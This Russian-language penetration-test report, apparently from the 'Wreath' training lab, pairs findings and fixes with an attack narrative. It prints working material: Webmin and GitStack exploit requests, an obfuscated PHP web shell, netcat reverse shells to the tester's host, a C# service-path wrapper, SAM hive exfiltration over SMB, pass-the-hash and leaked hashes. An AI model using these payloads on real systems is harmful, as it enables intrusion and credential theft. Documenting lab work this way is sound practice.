# Wreath — Отчёт о пентесте

## 1. Executive Summary (Резюме для руководства)

В рамках задания по пентесту сети Wreath была проведена комплексная проверка безопасности. Основной целью являлось проникновение во внутреннюю сеть и получение доступа к критическим узлам, включая машину разработчика (.100) и хосты с повышенными привилегиями.

В ходе тестирования были обнаружены критические уязвимости: бэкдор в Webmin (CVE-2019-15107), уязвимость удалённого выполнения кода в GitStack 2.3.10, проблема неправильной обработки загрузки файлов (двойное расширение), а также слабое место в конфигурации сервиса System Explorer (незаключённый в кавычки путь). Кроме того, были успешно применены техники обхода антивируса, pivoting через SSH и Chisel, атака Pass‑the‑Hash, а также методы извлечения хешей из SAM и SYSTEM.

Общий уровень защищённости сети оценён как низкий. Рекомендуется незамедлительно исправить найденные уязвимости, внедрить белые списки приложений и регулярно обновлять программное обеспечение.

## 2. Timeline (Хронология событий)

Час 0 — Начало сканирования сети Wreath.

Час 0.5 — Обнаружен порт 10000 с Webmin 1.890.

Час 1 — Эксплуатация CVE-2019-15107, получен root‑доступ к машине .200.

Час 1.5 — Установлен SSH-туннель и проведена разведка внутренней сети.

Час 2 — Найден сервер GitStack (.150), эксплуатация через публичный эксплойт, получен шелл SYSTEM.

Час 3 — Извлечены хеши SAM через Mimikatz, выполнен Pass‑the‑Hash к .150.

Час 4 — Настройка Hop‑listener в Empire для pivoting на Windows-машину (.100).

Час 5 — Через Chisel и sshuttle организован доступ к веб-приложению .100.

Час 6 — Анализ кода Git-репозитория, обнаружена уязвимость загрузки файлов.

Час 7 — Обфускация PHP-кода через ExifTool, получен RCE на .100 через параметр `wreath`.

Час 8 — Загрузка nc.exe и получение reverse shell от пользователя thomas.

Час 9 — Обнаружен сервис System Explorer с неэкранированным путём.

Час 10 — Компиляция wrapper‑эксплойта на C#, замена легитимного System.exe, перезапуск сервиса.

Час 10.5 — Получен шелл от NT AUTHORITY\SYSTEM на .100.

Час 11 — Извлечение SAM и SYSTEM через SMB, расшифровка хешей администратора.

Час 12 — Очистка файлов, удаление созданных пользователей и завершение теста.

## 3. Findings and Remediations (Уязвимости и их устранение)

### 3.1 Webmin 1.890 — бэкдор (CVE-2019-15107) (Критическая)

**Описание**: В версиях Webmin 1.890–1.920 был внедрён бэкдор, позволяющий выполнять произвольные команды на сервере без аутентификации. Уязвимость связана с ненадлежащей проверкой параметров в `password_change.cgi`. Злоумышленник может выполнить команды от имени root.

**Доказательство**: Отправлен POST-запрос на `/password_change.cgi` с параметром `old=AkkuS%7cid`, получен ответ с выводом команды.

**Риск**: Полная компрометация сервера (root‑доступ), возможность латерального перемещения.

**Рекомендация**: Обновить Webmin до версии 1.930+; отключить `password_change.cgi` при отсутствии необходимости; ограничить доступ к порту 10000 по IP-адресам.

### 3.2 GitStack 2.3.10 — RCE через неавторизованный запрос (Критическая)

**Описание**: В GitStack 2.3.10 существует уязвимость удалённого выполнения кода, связанная с недостаточной фильтрацией входных данных в `/web/registration`. Эксплойт `43777.py` позволяет выполнить произвольные команды через параметр `a=`.

**Доказательство**: Отправлен POST-запрос на `/web/registration` с параметром `a=whoami`, получен ответ `nt authority\system`.

**Риск**: Захват веб-сервера, получение прав SYSTEM, доступ к внутренней сети.

**Рекомендация**: Удалить GitStack или установить последний патч; использовать межсетевое экранирование; ограничить доступ к административным интерфейсам.

### 3.3 Хранение паролей в открытом виде / слабые хеши (Средняя)

**Описание**: Пароль пользователя Thomas (`i<3ruby`) был восстановлен через crackstation. Хеш NTLM пользователя был извлечён через `lsadump::sam`.

**Доказательство**: Хеш пользователя Thomas: `02d90eda8f6b6b06c32d5f207831101f`.

**Риск**: Переиспользование паролей, латеральное перемещение по сети, компрометация учётных записей.

**Рекомендация**: Внедрить LSA Protection, использовать длинные пароли (не менее 14 символов), добавить многофакторную аутентификацию.

### 3.4 Загрузка файлов с двойным расширением (Средняя)

**Описание**: Приложение проверяет только последнее расширение через `explode(".", $_FILES["file"]["name"])[1]`, что позволяет загрузить файл с двойным расширением, например `shell.jpg.php`. Сервер выполняет PHP-код из таких файлов.

**Уязвимый код**:
```php
$goodExts = ["jpg", "jpeg", "png", "gif"];
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

**Доказательство**: Загружен файл `test.jpg.php` с содержимым `<?php phpinfo(); ?>`. При обращении к файлу получен вывод PHP.

**Риск**: Загрузка произвольного PHP‑кода, удалённое выполнение команд, полный контроль над веб-сервером.

**Рекомендация**: Использовать белые списки MIME-типов, проверять содержимое через `getimagesize()` и хранить загружаемые файлы вне webroot; генерировать случайные имена файлов.

### 3.5 Сервис System Explorer — незаключённый в кавычки путь (Высокая)

**Описание**: Путь к исполняемому файлу сервиса не заключён в кавычки:
`C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. Windows интерпретирует пробелы как разделители, пытаясь последовательно запустить `Program.exe`, `System.exe` и т.д.

**Доказательство**: Создан файл `System.exe` в папке `C:\Program Files (x86)\System Explorer\System Explorer\`. При перезапуске сервиса файл был выполнен от имени SYSTEM, что дало reverse shell.

**Риск**: Эскалация привилегий до SYSTEM, возможность закрепления в системе.

**Рекомендация**: Заключить полный путь в кавычки в конфигурации сервиса. Для исправления выполнить:
```cmd
sc config "SystemExplorerHelpService" binPath= "\"C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe\""
```

## 4. Attack Narrative (Подробное описание атаки)

### Этап 1. Внешняя разведка

Сканирование Nmap выявило открытые порты: 80 (Apache), 22 (SSH) и 10000 (Webmin). На порту 10000 обнаружена версия MiniServ 1.890, уязвимая к CVE-2019-15107.

### Этап 2. Эксплуатация Webmin и получение доступа к .200

Использован публичный эксплойт для CVE-2019-15107. Отправлен POST-запрос на `/password_change.cgi` с параметрами:
`user=root&pam=&expired=2&old=AkkuS%7cid&new1=akkuss&new2=akkuss`

Получен вывод команды `id`, подтверждающий выполнение от root. Загружен статический бинарник для сканирования сети и найден ключ SSH для удобного подключения.

### Этап 3. Pivoting через SSH и атака на GitStack

Установлен туннель для доступа к внутренней сети:
```bash
sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa" 10.200.180.0/24 -x 10.200.180.200
```

Проведено сканирование. Найден хост .150 с открытыми портами 80 (HTTP), 3389 (RDP), 5985 (WinRM). Идентифицирован сервис GitStack 2.3.10. Использован эксплойт `43777.py`:
```bash
python3 43777.py -u http://10.200.180.150 -c whoami
```
Получен вывод `nt authority\system`. Загружен бинарник `ncat` и запущен reverse shell на .200.

### Этап 4. Извлечение учётных данных с .150 и Pass-the-Hash

Через полученный шелл загружен `mimikatz`. Выполнены команды:
```bash
privilege::debug
token::elevate
lsadump::sam
```
Извлечены NTLM-хеши пользователей, в том числе хеш администратора: `37db630168e5f82aafa8461e05c6bbd1`. Пароль пользователя Thomas (`i<3ruby`) взломан через crackstation. Установлено соединение через Evil-WinRM:
```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
```

### Этап 5. Настройка Empire и Hop Listener

Запущен PowerShell Empire сервер и Starkiller. Создан HTTP listener. Настроен Hop Listener для pivoting на Windows-машину .100. Сгенерирован стейджер, переданный на .150 через Evil-WinRM. После выполнения получен агент в Starkiller с правами администратора.

### Этап 6. Pivoting к .100 и анализ кода Git

Через Empire загружен скрипт `Invoke-Portscan.ps1`:
```powershell
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
```
Обнаружены открытые порты 80 (HTTP) и 3389 (RDP). Для доступа к .100 использован Chisel:
```bash
# На .150
./chisel-moersvz.exe server -p 48001 --socks5

# На Kali
./chisel_1.11.5_linux_386 client 10.200.180.150:48001 1080:socks
```
Настроен FoxyProxy (SOCKS5, 127.0.0.1:1080). В браузере открыт `http://10.200.180.100`. Обнаружена страница `/resource` с базовой аутентификацией. Использованы креды `thomas:i<3ruby`. Найден Git-репозиторий, скачан и проанализирован код.

### Этап 7. Обнаружение уязвимости загрузки файлов

В коде приложения найден уязвимый фрагмент:
```php
$goodExts = ["jpg", "jpeg", "png", "gif"];
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```
Фильтр проверяет только последнее расширение, что позволяет загрузить файл с двойным расширением, например `shell.jpg.php`.

### Этап 8. Обфускация PHP-кода и получение RCE

При попытке выполнить `system()` возникала ошибка из-за антивируса. Проверка `phpinfo()` показала, что функции `exec`, `shell_exec`, `system` частично заблокированы, но `shell_exec()` работает при определённых условиях.

Создан обфусцированный PHP-файл через ExifTool:
```bash
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" ruby.jpg
mv ruby.jpg ruby.jpg.php
```
Загружен файл через уязвимую форму. Параметр `?wreath=whoami` успешно выполняет команды.

### Этап 9. Получение reverse shell

Через веб-шелл загружен `nc64.exe`:
```cmd
curl -o C:\xampp\htdocs\resources\uploads\nc-moersvz.exe http://10.250.180.7:8888/nc64.exe
```
Запущен слушатель на Kali:
```bash
nc -lvnp 4444
```
Выполнена команда:
```cmd
powershell.exe C:\xampp\htdocs\resources\uploads\nc-moersvz.exe 10.250.180.7 4444 -e cmd.exe
```
Получен reverse shell от пользователя `wreath-pc\thomas`.

### Этап 10. Эскалация привилегий до SYSTEM через сервис

В системе обнаружен сервис System Explorer с путём:
`C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`
Путь не заключён в кавычки, что создаёт возможность подмены исполняемого файла.

Скомпилирован wrapper на C#:
```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("C:\\xampp\\htdocs\\resources\\uploads\\nc-moersvz.exe", "10.250.180.7 5555 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```
Компиляция:
```bash
mcs wrapper.cs
```

Файл `wrapper.exe` переименован в `System.exe` и помещён в папку
`C:\Program Files (x86)\System Explorer\System Explorer\`. Перезапуск сервиса:
```cmd
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```
На слушателе Kali (порт 5555) получен шелл от `NT AUTHORITY\SYSTEM`.

### Этап 11. Извлечение хешей SAM и SYSTEM

На Kali поднята SMB-шара:
```bash
impacket-smbserver share . -smb2support
```
На целевой машине .100 выполнены команды:
```cmd
reg.exe save HKLM\SAM \\10.250.180.7\share\sam.bak
reg.exe save HKLM\SYSTEM \\10.250.180.7\share\system.bak
```
На Kali извлечены хеши:
```bash
python3 /home/brakka/.local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL
```
Получены NTLM-хеши пользователей, включая администратора локальной машины.

## 5. Cleanup (Очистка)

После завершения тестирования удалены все созданные учётные записи и загруженные временные файлы:
- `nc-moersvz.exe`
- `wrapper.exe`, `System.exe`
- `ruby.jpg.php`, `test.jpg.php`

Из системного реестра удалены добавленные записи (если создавались). На машине .200 удалены следы эксплуатации (файлы в `/tmp`, логовые записи). Сброшены все туннели и прокси. SMB-шара на Kali остановлена. Логи целевых систем не модифицировались.

## 6. Conclusion (Заключение)

Проведённое тестирование показало, что сеть Wreath имеет критические уязвимости, которые позволяют злоумышленнику получить полный контроль над инфраструктурой. Наиболее серьёзными проблемами являются использование устаревшего ПО (Webmin, GitStack), недостаточная проверка загружаемых файлов (двойное расширение) и неправильная конфигурация сервисов Windows (незаключённый в кавычки путь). Кроме того, пароль пользователя Thomas был восстановлен за считанные минуты, что указывает на слабую политику паролей.

Рекомендуется как можно скорее применить предложенные исправления, провести повторное тестирование и внедрить процессы регулярного обновления программного обеспечения.

## 7. References (Ссылки)

- CVE-2019-15107 (Webmin Backdoor) — https://nvd.nist.gov/vuln/detail/CVE-2019-15107
- GitStack 2.3.10 RCE (Exploit‑DB 43777) — https://www.exploit-db.com/exploits/43777
- MITRE ATT&CK: T1572 (Protocol Tunnelling), T1003 (Credential Dumping), T1055 (Process Injection)
- OWASP — Unrestricted File Upload — https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- Unquoted Service Path — https://owasp.org/www-community/attacks/Unquoted_Service_Path

## 8. Appendices (Приложения)

### A. Эксплойт для Webmin (CVE-2019-15107)
Команда для выполнения произвольной команды:
```bash
curl -k "https://10.200.180.200:10000/password_change.cgi" -X POST \
  -H "Referer: https://10.200.180.200:10000/session_login.cgi" \
  -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" \
  -d "user=root&pam=&expired=2&old=AkkuS%7cid&new1=akkuss&new2=akkuss"
```

### B. Эксплойт для GitStack 2.3.10 (43777.py)
Основной фрагмент кода, выполняющий команду:
```python
def exploit(url, command):
    payload = {
        'a': command
    }
    response = requests.post(url + '/web/registration', data=payload)
    return response.text
```

### C. Полный код PHP-обфускации (ExifTool)
```bash
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" ruby.jpg
mv ruby.jpg ruby.jpg.php
```

### D. Код wrapper-эксплойта (C#)
```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("C:\\xampp\\htdocs\\resources\\uploads\\nc-moersvz.exe", "10.250.180.7 5555 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```
Компиляция: `mcs wrapper.cs`

### E. Команды для извлечения хешей SAM и SYSTEM
На целевой машине:
```cmd
reg.exe save HKLM\SAM \\10.250.180.7\share\sam.bak
reg.exe save HKLM\SYSTEM \\10.250.180.7\share\system.bak
```
На Kali:
```bash
python3 /home/brakka/.local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

### F. Пример работы FoxyProxy и Chisel
Запуск Chisel на .150 (Windows):
```cmd
./chisel-moersvz.exe server -p 48001 --socks5
```
Запуск клиента на Kali:
```bash
./chisel_1.11.5_linux_386 client 10.200.180.150:48001 1080:socks
```
Настройка FoxyProxy:
- Тип: SOCKS5
- IP: 127.0.0.1
- Порт: 1080
- Паттерн: `^(http|ws)s?://10(\.\d+){3}/` (белый список)

### G. Команды для исправления уязвимости сервиса (System Explorer)
Исправление незаключённого в кавычки пути:
```cmd
sc config "SystemExplorerHelpService" binPath= "\"C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe\""
```